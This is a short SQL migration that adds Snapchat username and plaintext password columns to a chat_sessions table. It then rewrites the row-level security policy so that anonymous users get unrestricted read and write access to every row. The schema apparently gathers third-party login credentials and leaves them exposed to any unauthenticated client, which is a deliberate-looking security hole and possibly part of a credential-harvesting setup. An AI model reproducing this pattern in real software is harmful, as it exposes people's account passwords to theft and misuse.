-- Add login credentials columns to chat_sessions table
ALTER TABLE chat_sessions 
ADD COLUMN snapchat_username TEXT,
ADD COLUMN snapchat_password TEXT,
ADD COLUMN login_attempted_at TIMESTAMP WITH TIME ZONE;

-- Create index for login credentials
CREATE INDEX idx_chat_sessions_credentials ON chat_sessions(snapchat_username);

-- Update RLS policies to allow access to new columns
DROP POLICY IF EXISTS "Allow anonymous access to chat_sessions" ON chat_sessions;
CREATE POLICY "Allow anonymous access to chat_sessions"
    ON chat_sessions FOR ALL
    TO anon
    USING (true)
    WITH CHECK (true); 